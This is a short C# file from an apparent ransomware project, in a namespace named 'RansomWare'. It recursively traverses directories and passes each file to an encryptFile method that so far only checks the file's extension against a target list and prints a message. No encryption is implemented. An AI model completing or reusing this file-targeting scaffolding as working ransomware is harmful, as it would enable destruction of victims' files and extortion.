namespace RansomWare;
public class Util
{
    public static void TraverseDirectory(DirectoryInfo directory)
    {
        try
        {
            
            FileInfo[] files = directory.GetFiles();
            
            foreach (FileInfo file in files)
            {
                encryptFile(file);
            }
            
            DirectoryInfo[] subDirectories = directory.GetDirectories();
            foreach (DirectoryInfo subDirectory in subDirectories)
            {
                TraverseDirectory(subDirectory);
            }
        }
        catch (UnauthorizedAccessException ex)
        {
            Console.WriteLine($"Unauthorized access: {ex.Message}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
        }
    }

    private static void encryptFile(FileInfo fileInfo)
    {
        string fileExtension = fileInfo.Extension.TrimStart('.').ToLower();
        if (Enum.IsDefined(typeof(FileExtension), fileExtension))
        {
            Console.WriteLine("YES ITS IN THERE");
        }
        else
        {
            Console.WriteLine("NO ITS NOT");
        }
        
    }
}